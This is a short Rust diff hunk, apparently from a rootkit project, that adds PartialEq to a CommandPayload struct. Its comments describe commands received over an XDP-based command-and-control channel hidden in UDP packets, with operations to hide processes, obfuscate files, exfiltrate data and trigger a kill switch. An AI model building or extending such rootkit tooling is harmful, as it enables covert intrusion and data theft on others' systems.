@@ -83,7 +83,7 @@ pub struct RootkitConfig {
 /// Payload received via XDP C2 channel.
 /// Extracted from UDP packets matching MAGIC_BYTES.
 #[repr(C)]
-#[derive(Clone, Copy, Debug)]
+#[derive(Clone, Copy, Debug, PartialEq)]
 pub struct CommandPayload {
     /// Command type: 1=hide_pid, 2=unhide_pid, 3=obfuscate_file, 4=exfil, 5=kill_switch
     pub cmd_type: u32,
